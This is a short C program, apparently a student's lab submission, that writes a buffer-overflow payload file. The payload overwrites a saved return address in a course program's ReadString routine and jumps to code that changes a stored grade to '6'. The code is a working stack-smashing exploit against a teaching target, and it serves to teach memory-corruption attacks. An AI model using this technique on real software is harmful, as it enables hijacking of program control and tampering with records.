/********************************************
 * Georgios Gerasimos Leventopoulos csd4152 *
 * createdata6.c                            *
 ********************************************/

#include <stdio.h>
#include <stdlib.h>

int main(void){
        int i;
        FILE *data6;
        if((data6 = fopen("data6", "w")) == NULL){
                fprintf(stderr, "\nUnable to write file: data6\n\n");
                exit(EXIT_FAILURE);
        }
        fprintf(data6, "GeorgeLeve");   /* Write my name */
        fputc('\0', data6);
        for(i = 0; i < 37; i++)         /* Fill the empty cells in array buff + 14 (old_ebp segment) */
                fputc('\0', data6);     /* Write random things , for example '\0' */
        fputc(56, data6);       /* Goto address - we go to the ret address - Overwritten */

        fputc(0x68, data6);     /* Change return address of ReadString method */
        fputc(0x8b, data6);     /* The return address must be 0x8048b68 (<main+74>:  movb  $0x36,0x80d46e8) */
        fputc(0x04, data6);     /* So when we return we go to the grade = '6' command and we change the grade */
        fputc(0x08, data6);

        fputc(0xe0, data6);     /* Address of Name = 080d65e0 (bss section) */
        fputc(0x65, data6);
        fputc(0x0d, data6);
        fputc(0x08, data6);

        fclose(data6);  /* Close the file */
        return 0;
}


